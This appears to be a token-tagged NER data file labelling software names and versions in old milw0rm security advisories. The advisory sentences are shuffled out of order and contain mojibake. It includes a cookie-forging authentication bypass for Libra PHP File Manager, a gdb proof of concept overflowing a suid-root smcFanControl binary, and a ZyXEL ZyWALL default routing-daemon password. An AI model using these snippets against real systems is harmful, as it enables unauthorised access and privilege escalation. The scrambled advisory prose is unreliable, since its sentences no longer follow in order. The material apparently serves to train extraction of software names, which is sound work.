] O
Discovered O
By O
Stack O
[ O
+ O
] O
Greetz O
: O
All O
my O
freind O
exploit O
: O
javascript O
: O
document.cookie O
= O
user=1 O
; O
path= O
; O
document.cookie O
= O
pass=1 O
; O
path= O
; O
milw0rm.com O
[ O
2008-09-26 O
] O

Libra SN
PHP SN
File SN
Manager SN
1.18 SV
- O
Insecure O
Cookie O
Handling O

Stack-based O
buffer O
overflow O
in O
the O
smc O
program O
in O
smcFanControl SN
2.1.2 SV
allows O
local O
users O
to O
execute O
arbitrary O
code O
and O
gain O
privileges O
via O
a O
long O
-k O
option O
. O

vnsecurity.net O
disclaims O
all O
warranties O
, O
either O
express O
or O
implied O
, O
including O
the O
warranties O
of O
merchantability O
and O
fitness O
for O
a O
particular O
purpose O
. O

A O
big O
credit O
for O
the O
author O
Hendrik O
Holtmann O
. O

vnsecurity.net O
reserves O
the O
right O
to O
change O
or O
update O
this O
notice O
at O
any O
time O
. O

milw0rm.com O
[ O
2008-11-11 O
] O

break O
; O
snip O
snip O
$ O
ls O
-alF O
/Applications/smcFanControl.app/Contents/Resources/smc O
-r-sr-sr-x O
1 O
root O
admin O
18212 O
Jun O
13 O
2007 O
/Applications/smcFanControl.app/Contents/Resources/smc O
With O
default O
installation O
, O
smc O
binary O
is O
always O
install O
with O
suid O
root O
. O

Disclosure O
vnsecurity.net O
adapts O
`RFPolicy O
v2.0 O
< O
in O
notifying O
vendors O
. O

: O
Public O
disclosure O
: O
12th O
Nov O
2008 O
: O
PoC O
code O
: O
Exploit O
for O
the O
first O
overflow O
written O
by O
KaiJern O
, O
Lau O
: O
: O
$ O
gdb O
-q O
/Applications/smcFanControl.app/Contents/Resources/smc O
Reading O
symbols O
for O
shared O
libraries O
... O
done O
( O
gdb O
) O
r O
-k O
`ruby O
-e O
print O
A O
45 O
`BBBBCCCC O
Starting O
program O
: O
/Applications/smcFanControl.app/Contents/Resources/smc O
-k O
`ruby O
-e O
print O
A O
45 O
`BBBBCCCC O
Reading O
symbols O
for O
shared O
libraries O
done O
Program O
received O
signal O
EXC_BAD_ACCESS O
, O
Could O
not O
access O
memory O
. O

This O
will O
end O
up O
with O
a O
buffer O
overflow O
bug O
. O

Workaround O
Upgrade O
to O
latest O
version O
. O

vnsecurity.net O
ADVISORY O
2008-11 O
: O
Title O
: O
Buffer O
overflows O
in O
smcFanControl O
2.1.2 O
for O
OSX O
: O
Severity O
: O
Critical O
: O
Reporter O
: O
KaiJern O
, O
Lau O
( O
kjlau O
at O
vnsecurity.net O
) O
: O
Products O
: O
smcFanControl O
2.1.2 O
: O
OS O
: O
OSX O
: O
Fixed O
in O
: O
to O
be O
release O
smcFanControl O
2.1.3 O
About O
smcFanControl O
First O
of O
all O
, O
this O
is O
a O
very O
wonderul O
software O
and O
most O
of O
the O
macbook O
install O
with O
this O
software O
. O

Fix O
Hendrik O
Holtmann O
releasing O
smcFanControl O
2.1.3 O
. O

In O
addition O
to O
that O
fans O
are O
still O
in O
automatic O
mode O
, O
so O
the O
speed O
of O
your O
fans O
will O
increase O
, O
if O
CPU O
load O
gets O
higher O
. O

Nov O
11th O
, O
2008 O
: O
Hendrik O
Holtmann O
responded O
with O
version O
upgrade O
. O

Code O
from O
smc.c O
snip O
snip O
int O
main O
( O
int O
argc O
, O
char O
argv O
[ O
] O
) O
{ O
int O
c O
; O
extern O
char O
optarg O
; O
extern O
int O
optind O
, O
optopt O
, O
opterr O
; O
kern_return_t O
result O
; O
int O
op O
= O
OP_NONE O
; O
UInt32Char_t O
key O
= O
0 O
; O
SMCVal_t O
val O
; O
while O
( O
( O
c O
= O
getopt O
( O
argc O
, O
argv O
, O
fhk O
: O
lrw O
: O
v O
1 O
) O
{ O
switch O
( O
c O
) O
{ O
case O
f O
: O
op O
= O
OP_READ_FAN O
; O
break O
; O
case O
k O
: O
sprintf O
( O
key O
, O
optarg O
) O
; O
Overflow O
! O
! O
! O

Reason O
: O
KERN_INVALID_ADDRESS O
at O
address O
: O
0x43434343 O
0x43434343 O
in O

Quote O
from O
the O
Official O
WebSite O
: O
smcFanControl O
lets O
the O
user O
set O
the O
minimum O
speed O
of O
the O
build O
in O
fans O
. O

: O
Initial O
vendor O
contact O
: O
Nov O
10th O
, O
2008 O
: O
Initial O
contact O
sent O
to O
holtmann O
@ O
mac.com O
, O
while O
we O
are O
having O
coffee O
. O

It O
has O
not O
been O
verified O
if O
other O
version O
( O
version O
1.x O
maybe O
) O
are O
also O
vulnerable O
. O

Description O
First O
of O
all O
, O
let O
us O
look O
at O
/Applications/smcFanControl.app/Contents/Resources/smc O
Input O
option O
of O
smc O
-k O
was O
not O
able O
to O
handle O
large O
buffer O
. O

: O
Vendor O
response O
: O
Nov O
10th O
, O
2008 O
: O
Hendrik O
Holtmann O
response O
as O
soon O
as O
we O
finish O
our O
coffee O
. O

Your O
use O
of O
the O
information O
on O
the O
advisory O
or O
materials O
linked O
from O
the O
advisory O
is O
at O
your O
own O
risk O
. O

However O
in O
order O
not O
to O
damage O
your O
machine O
scFanControl O
let O
you O
not O
set O
minimum O
speed O
to O
a O
rate O
under O
Apple O
defaults O
. O

So O
you O
can O
increase O
your O
minimum O
fan O
speed O
to O
make O
your O
intel O
mac O
run O
cooler O
. O

( O
) O
( O
gdb O
) O
i O
r O
eax O
0x0 O
0 O
ecx O
0xbfffeb8c O
-1073747060 O
edx O
0x94bf94a6 O
-1799383898 O
ebx O
0x41414141 O
1094795585 O
esp O
0xbfffed60 O
0xbfffed60 O
ebp O
0x42424242 O
0x42424242 O
esi O
0x41414141 O
1094795585 O
edi O
0x41414141 O
1094795585 O
eip O
0x43434343 O
0x43434343 O
eflags O
0x10282 O
66178 O
cs O
0x17 O
23 O
ss O
0x1f O
31 O
ds O
0x1f O
31 O
es O
0x1f O
31 O
fs O
0x0 O
0 O
gs O
0x37 O
55 O
: O
: O
Blog O
: O
- O
Thanks O
to O
- O
Hack O
In O
The O
Box O
, O
beist.org O
- O
Blue O
Moon O
Consulting O
Co. O
, O
Ltd O
, O
information O
provided O
in O
this O
advisory O
is O
provided O
as O
is O
without O
warranty O
of O
any O
kind O
. O

: O
Further O
communication O
: O
Nov O
10th O
, O
2008 O
: O
Technical O
summary O
sent O
to O
Hendrik O
Holtmann O
. O

There O
is O
a O
possibility O
for O
a O
local O
user O
to O
gain O
root O
privilege O
. O

smcFanControl SN
2.1.2 SV
( O
OSX O
) O
- O
Multiple O
Buffer O
Overflow O
Vulnerabilities O
( O
PoC O
) O

The O
remote O
management O
interface O
in O
SIP O
Enablement O
Services O
( O
SES O
) O
Server O
in O
Avaya SN
SIP SN
Enablement SN
Services SN
5.0 SV
, O
and O
Communication SN
Manager SN
( O
CM SN
) O
5.0 SV
on O
the O
S8300C O
with O
SES O
enabled O
, O
proceeds O
with O
Core O
router O
updates O
even O
when O
a O
login O
is O
invalid O
, O
which O
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
messaging O
outage O
) O
or O
gain O
privileges O
via O
an O
update O
request O
. O

ZyXEL O
ZyWALL O
1050 O
has O
a O
hard-coded O
password O
for O
the O
Quagga O
and O
Zebra O
processes O
that O
is O
not O
changed O
when O
it O
is O
set O
by O
a O
user O
, O
which O
allows O
remote O
attackers O
to O
gain O
privileges O
. O

Information O
on O
other O
vulnerable O
products O
and O
firmwares O
is O
pending O
from O
the O
vendor O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xe2 O
x84 O
xa2s O
end O
. O

of O
the O
appliance O
. O

The O
vulnerability O
was O
discovered O
on O
ZyWall O
1050 O
appliance O
other O
versions O
could O
be O
affected O
as O
well O
. O

milw0rm.com O
[ O
2008-03-21 O
] O

Vendor O
: O
ZyXEL O
Products O

Name O
: O
ZyXEL O
ZyWALL O
Quagga/Zebra O
Remote O
Root O
Vulnerability O
Release O
Date O
: O
10 O
March O
2008 O
Discover O
: O
Pranav O
Joshi O
< O
joshipranav O
@ O
gmail.com O

Affected O
: O
ZyWALL O
( O
Status O
on O
other O
affected O
products O
& O
firmwares O
pending O
from O
vendor O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xe2 O
x84 O
xa2s O
end O
) O
CVE-2008-1160 O
BID O
28184 O
Technical O
Details O
The O
vulnerability O
in O
the O
Quagga/Zebra O
routing O
daemon O
, O
exists O
due O
to O
the O
fact O
that O
the O
appliance O
fails O
to O
change O
the O
password O
needed O
to O
login O
into O
the O
Quagga/Zebra O
daemon O
running O
on O
ports O
2601 O
, O
2602 O
( O
Quagga/RIP O
) O
& O
2604 O
( O
Quagga/OSPF O
) O
/TCP O
, O
even O
though O
the O
password O
of O
the O
appliance O
has O
been O
changed O
an O
attacker O
can O
still O
use O
the O
default O
password O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xcb O
x9czebra O
xc3 O
xa2 O
xe2 O
x82 O
xac O
xe2 O
x84 O
xa2 O
to O
log O
into O
the O
Quagga/Zebra O
service O
to O
view O
and O
manipulate O
the O
routing O
information O
etc O
. O

